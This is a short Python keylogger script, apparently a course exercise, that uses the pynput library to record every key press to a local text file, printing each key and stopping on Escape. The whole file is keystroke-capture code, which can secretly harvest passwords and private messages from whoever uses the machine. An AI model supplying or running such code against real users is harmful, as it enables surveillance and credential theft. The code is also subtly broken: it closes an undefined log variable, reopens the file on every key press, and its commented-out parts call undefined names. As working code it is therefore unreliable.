import time
import sys
from pynput import keyboard

def writeToLog(log, text):
    log.write(text)
    log.write('\n')

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    log = open("/Users/victorzhang/Documents/Computing/COMP6411/keylogger/fullLogs.txt", 'a')
    key_name = get_key_name(key)
    writeToLog(log, format(key_name))
    print('Key {} pressed.'.format(key_name))


    if key_name == 'Key.esc':
        print('Exiting...')
        return False

def main():

    with keyboard.Listener(
        on_press = on_press) as listener:
        listener.join()
        log.close()

    # with keyboard.Listener(
    #     on_press = on_press,
    #     on_release = on_release) as listener:
    #     listener.join()

    # for key in arrows:
    #     writeToLogs(log, key)
    #     writeToLogs(keyboard, key)

    # for key in modifiers:
    #     writeToLogs(log, key)
    #     writeToLogs(keyboard, key)

main()